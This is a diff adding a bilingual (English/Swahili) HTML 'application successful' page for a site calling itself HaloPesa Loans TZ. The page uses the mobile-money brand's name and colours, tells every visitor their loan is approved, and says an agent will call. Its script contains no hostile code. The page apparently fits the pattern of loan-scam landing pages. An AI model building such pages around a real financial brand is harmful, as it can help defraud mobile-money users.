@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa Loans TZ — Success</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #F58220;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-mark {
+            width: 40px; height: 40px; background: #F58220;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
+        }
+        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
+        .logo-text span { color: #F58220; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+
+        .card {
+            background: #fff; width: 100%; max-width: 500px;
+            border-radius: 20px; padding: 44px 32px 40px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06);
+            height: fit-content;
+            text-align: center;
+        }
+
+        .check-circle {
+            width: 96px; height: 96px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #F58220, #ff9a45);
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-size: 48px; font-weight: 900;
+            margin: 0 auto 26px;
+            box-shadow: 0 14px 32px rgba(245,130,32,0.4);
+            animation: pop 0.5s ease-out;
+        }
+        @keyframes pop {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        h1 {
+            font-size: 26px; font-weight: 900; color: #111;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .sub {
+            font-size: 15px; color: #666; line-height: 1.6;
+            margin-bottom: 32px;
+            padding: 0 6px;
+        }
+
+        .info-box {
+            background: #fffbf6;
+            border: 1px solid #ffe3c7;
+            border-radius: 14px;
+            padding: 22px 20px;
+            margin-bottom: 26px;
+            text-align: left;
+        }
+
+        .info-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0;
+            font-size: 14px;
+        }
+        .info-row + .info-row { border-top: 1px dashed #ffe3c7; }
+
+        .info-label { color: #8a5a2a; font-weight: 600; }
+        .info-value { color: #111; font-weight: 800; text-align: right; }
+
+        .info-value.ref {
+            font-family: monospace;
+            font-size: 13px;
+            color: #F58220;
+        }
+
+        .status-pill {
+            display: inline-block;
+            background: #eaf7ea;
+            color: #1e7d1e;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            margin-bottom: 22px;
+        }
+
+        .next-steps {
+            text-align: left;
+            margin-bottom: 26px;
+        }
+
+        .next-title {
+            font-size: 14px; font-weight: 800; color: #111;
+            margin-bottom: 12px;
+        }
+
+        .next-item {
+            display: flex; align-items: flex-start; gap: 10px;
+            font-size: 13px; color: #555; line-height: 1.5;
+            padding: 6px 0;
+        }
+        .next-item .dot {
+            width: 22px; height: 22px; border-radius: 50%;
+            background: #F58220; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: 900; flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .home-btn {
+            display: inline-block;
+            background: #111; color: #F58220;
+            padding: 16px 36px;
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            text-decoration: none;
+            transition: background 0.2s, transform 0.1s;
+        }
+        .home-btn:hover { background: #000; }
+        .home-btn:active { transform: scale(0.98); }
+
+        .footer {
+            background: #111; color: #F58220; text-align: center;
+            padding: 18px; font-size: 12px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 32px 22px; }
+            h1 { font-size: 22px; }
+            .check-circle { width: 80px; height: 80px; font-size: 40px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo-box">
+            <div class="logo-mark">H</div>
+            <div class="logo-text">Halo<span>Pesa</span></div>
+        </div>
+        <span class="header-title" id="headerTitle">Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+
+            <div class="check-circle">✓</div>
+
+            <div class="status-pill" id="statusPill">Approved</div>
+
+            <h1 id="heading">Application Successful</h1>
+
+            <p class="sub" id="subheading">
+                Your loan application has been received and approved. Our team will contact you shortly to complete the process.
+            </p>
+
+            <div class="info-box">
+                <div class="info-row">
+                    <span class="info-label" id="lblRef">Reference</span>
+                    <span class="info-value ref" id="refValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label" id="lblPhone">Phone</span>
+                    <span class="info-value" id="phoneValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label" id="lblDate">Date</span>
+                    <span class="info-value" id="dateValue">—</span>
+                </div>
+            </div>
+
+            <div class="next-steps">
+                <div class="next-title" id="nextTitle">What happens next?</div>
+                <div class="next-item">
+                    <span class="dot">1</span>
+                    <span id="next1">Our agent will call you within 24 hours.</span>
+                </div>
+                <div class="next-item">
+                    <span class="dot">2</span>
+                    <span id="next2">Keep your Halotel number active and reachable.</span>
+                </div>
+                <div class="next-item">
+                    <span class="dot">3</span>
+                    <span id="next3">Funds will be disbursed to your HaloPesa wallet.</span>
+                </div>
+            </div>
+
+            <a href="index.html" class="home-btn" id="homeBtn">Back to Home</a>
+
+        </div>
+    </main>
+
+    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>
+
+    <script>
+        const LANG = {
+            en: {
+                headerTitle: 'Mobile Services',
+                statusPill: 'Approved',
+                heading: 'Application Successful',
+                subheading: 'Your loan application has been received and approved. Our team will contact you shortly to complete the process.',
+                lblRef: 'Reference',
+                lblPhone: 'Phone',
+                lblDate: 'Date',
+                nextTitle: 'What happens next?',
+                next1: 'Our agent will call you within 24 hours.',
+                next2: 'Keep your Halotel number active and reachable.',
+                next3: 'Funds will be disbursed to your HaloPesa wallet.',
+                homeBtn: 'Back to Home',
+                footer: '© 2026 HaloPesa Loans TZ'
+            },
+            sw: {
+                headerTitle: 'Huduma za Simu',
+                statusPill: 'Imeidhinishwa',
+                heading: 'Maombi Yamefanikiwa',
+                subheading: 'Maombi yako ya mkopo yamepokelewa na kuidhinishwa. Timu yetu itakuwasiliana nawe hivi karibuni kukamilisha mchakato.',
+                lblRef: 'Kumbukumbu',
+                lblPhone: 'Simu',
+                lblDate: 'Tarehe',
+                nextTitle: 'Kinachofuata?',
+                next1: 'Wakala wetu atakupigia simu ndani ya saa 24.',
+                next2: 'Weka namba yako ya Halotel ikiwa hai na inapatikana.',
+                next3: 'Fedha zitatumwa kwenye pochi yako ya HaloPesa.',
+                homeBtn: 'Rudi Nyumbani',
+                footer: '© 2026 HaloPesa Loans TZ'
+            }
+        };
+
+        const lang = localStorage.getItem('lang') || 'en';
+        const t = LANG[lang];
+
+        ['headerTitle','statusPill','heading','subheading','lblRef','lblPhone',
+         'lblDate','nextTitle','next1','next2','next3','homeBtn','footer'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.textContent = t[id];
+        });
+
+        // Params
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone') || '';
+        const ref   = params.get('ref')   || 'REF' + Date.now();
+
+        function formatPhone(p) {
+            const clean = p.replace(/\D/g, '');
+            if (clean.length === 9) {
+                return '+255 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+            }
+            return clean ? '+255 ' + clean : '—';
+        }
+
+        document.getElementById('refValue').textContent   = ref;
+        document.getElementById('phoneValue').textContent = formatPhone(phone);
+
+        // Today's date
+        const d = new Date();
+        const dateStr = d.toLocaleDateString(lang === 'sw' ? 'sw-TZ' : 'en-GB', {
+            day: '2-digit', month: 'short', year: 'numeric'
+        });
+        document.getElementById('dateValue').textContent = dateStr;
+    </script>
+</body>
+</html>
